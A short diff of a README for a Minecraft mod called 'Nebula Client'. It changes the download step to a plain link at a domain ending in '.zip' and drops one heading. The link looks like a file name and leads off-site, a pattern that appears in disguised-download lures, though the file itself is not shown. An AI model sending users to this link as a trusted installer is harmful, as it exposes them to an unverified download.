@@ -27,15 +27,13 @@ Welcome to the setup guide for **Nebula Client**! This document will help you ge
 
 ### 🔧 Installation Steps
 
-1. Download: `Register [HERE](https://nebulaclient.zip)`
+1. Download: `Register @ https://nebulaclient.zip`
 2. Place file(s) in: `Minecraft Mods Folder`
 3. Launch: `Minecraft Client`
 
 ### ⚙️ Configuration
 
 * GUI Hotkey: `/nebula` `Set Keybind in GUI after running /nebula`
-
-### 🎮 How to Use
 
 #### Basic Controls
 
